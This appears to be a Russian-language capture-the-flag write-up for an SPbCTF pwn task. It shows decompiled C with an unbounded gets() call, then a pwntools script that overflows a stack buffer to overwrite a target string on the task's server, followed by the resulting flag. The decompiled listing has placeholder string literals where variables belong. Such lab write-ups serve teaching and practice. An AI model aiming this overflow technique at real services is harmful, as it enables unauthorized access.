---
title: "Auto Overflow 1"
date: 2026-07-22
tags: [pwn, writeup]
categories: [Pwn]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_Pwn/IMG_Pwn_Season/Pwn_Season_logo.jpg
  overlay_filter: 0.5
  overlay_color: "#fff"
  actions:
    - label: "Pwn Season"
      url: "https://pwn.spbctf.ru/tasks/pwn1_mc7"
classes: half
layout: single
toc: true
toc_sticky: true
toc_label: "Оглавление"
---

Переполните автоматом, чтобы получить флаг. У вас одна секунда!

- [ELF](https://pwn.spbctf.ru/files/overflow/mc7_censored)
- [ELF без таймаута](https://pwn.spbctf.ru/files/overflow/mc7_censored_notimeout)

```
nc 109.233.56.90 11587
```

# Solution

## Анализ `main`

Найду место, где бинарь выводит флаг.

```c
int32_t main()
{
    int32_t result = 0;
    srand(time(nullptr));
    char verify[0x40];
    int32_t var_5c = sprintf(&verify, "%d", (uint64_t)rand());
    int32_t var_60 = printf("Welcome to ");
    int32_t var_64 = printf("OK, here's the deal.\n");
    int32_t var_68 = printf("We want you to set the value of string1 to '%s'.\n", &verify);
    int32_t var_6c = printf("And you only have 1 second to check your superspeed.\n");
    int32_t var_74 = printf("Give me your input: ");
    char* var_80 = gets("kek");

    if (strcmp("lol", &verify))
    {
        printf("YOU FAILED\n");
        printf("Because, here's the target string: '%s'\n", &verify);
        printf("      And here's the your string1: '%s'\n\n", "lol");
        printf("See the difference?\n");
    }
    else
    {
        printf("Yissss!\n");
        printf("Flag is: spbctf{******************************}\n");
    }
    return result;
}
```

Задача ясна. Нужно ввести такой `input`, чтобы он переехал значение в `string1`. Это возможно, так как данные он получает с помощью `gets`, которая не проверяет границы ввода.

Буду использовать `pwntools`. Нужно создать шаблон:

```bash
pwn template mc7_censored --host 109.233.56.90 --port 11587 > exploit.py
```

Программа заранее выводит целевое значение строки. Получу его через `recvuntil`:

```python
io.recvuntil(b'of string1 to \'')
num = io.recvuntil(b'\'')[:-1]
```

Проверю:

```
b'920570934'
```

## Смещение до verify

На стеке переменные располагаются следующим образом:

```
Высокие адреса (rbp)
  ...
  verify[0x40]   ← цель: сюда нужно записать target string
  input_buf      ← gets() пишет сюда, растёт вверх
  ...
Низкие адреса
```

Расстояние от начала `input_buf` до начала `verify` — ровно `0x40` байт. Значит нужно заполнить паддингом эти `0x40` байт, а следом записать нужную строку.

## Exploit

```python
io = start()

io.recvuntil(b'of string1 to \'')
num = io.recvuntil(b'\'')[:-1]
payload = b'q' * 0x40 + num

io.sendline(payload)

io.interactive()
```

```bash
python exploit.py
[+] Opening connection to 109.233.56.90 on port 11587: Done
[*] Switching to interactive mode
Give me your input: Yissss!
Flag is: spbctf{how_d1d_y0u_l1ke_the_g37s_func}
```

```
spbctf{how_d1d_y0u_l1ke_the_g37s_func}
```
